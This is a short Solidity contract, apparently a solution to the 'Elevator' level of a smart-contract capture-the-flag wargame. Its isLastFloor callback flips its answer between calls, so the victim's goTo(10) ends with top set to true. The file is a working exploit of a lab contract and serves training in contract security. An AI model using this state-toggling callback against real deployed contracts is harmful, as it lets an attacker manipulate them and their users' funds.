pragma solidity ^0.4.18;

import '../levels/Elevator.sol';

contract ElevatorAttack {
  bool public isLast;
  
  function isLastFloor(uint floor) view public returns (bool) {
    isLast = ! isLast;
    return isLast;
  }

  function attack(address _victim) public returns (bool) {
    Elevator elevator = Elevator(_victim);
    elevator.goTo(10);

    return elevator.top();
  }
}